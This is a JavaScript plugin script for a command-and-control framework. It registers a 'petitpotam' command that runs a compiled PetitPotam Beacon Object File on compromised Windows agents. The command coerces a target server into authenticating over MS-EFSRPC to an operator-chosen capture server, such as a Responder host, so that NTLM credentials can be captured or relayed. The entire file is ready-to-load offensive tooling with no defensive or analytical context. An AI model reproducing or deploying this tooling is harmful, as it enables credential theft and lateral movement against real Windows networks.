var metadata = {
    name: "PetitPotam-BOF",
    description: "Coerce Windows hosts to authenticate via MS-EFSRPC (BOF)"
};

var cmd_petitpotam = ax.create_command("petitpotam", "Coerce Windows hosts to authenticate to another machine via MS-EFSRPC (BOF)", "petitpotam <capture-server> <target-server>");
cmd_petitpotam.addArgString("captureserver", true, "IP or hostname of the capture/listener server (e.g. Responder host)");
cmd_petitpotam.addArgString("target",        true, "IP or hostname of the target server to coerce");
cmd_petitpotam.setPreHook(function (id, cmdline, parsed_json) {
    var captureserver = parsed_json["captureserver"];
    var target        = parsed_json["target"];
    var bof_params    = ax.bof_pack("wstr,wstr", [captureserver, target]);
    var bof_path      = ax.script_dir() + "PetitPotam." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `Task: PetitPotam coerce ${target} → ${captureserver}`);
});

var group_petitpotam = ax.create_commands_group("PetitPotam-BOF", [cmd_petitpotam]);
ax.register_commands_group(group_petitpotam, ["beacon", "gopher", "kharon"], ["windows"], []);
